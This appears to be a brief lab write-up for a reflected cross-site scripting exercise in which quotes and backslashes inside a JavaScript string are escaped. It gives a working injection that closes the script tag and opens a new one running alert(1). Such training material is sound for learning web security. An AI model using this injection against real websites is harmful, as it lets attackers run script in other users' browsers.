**Reflected XSS into a JavaScript string with single quote and backslash escaped**

Arbitrary search string to see where it get reflected back

Break out of first script tag
```
</script>
``` 

Than create another script with our alert(1)
```
</script><script>alert(1)</script>
```

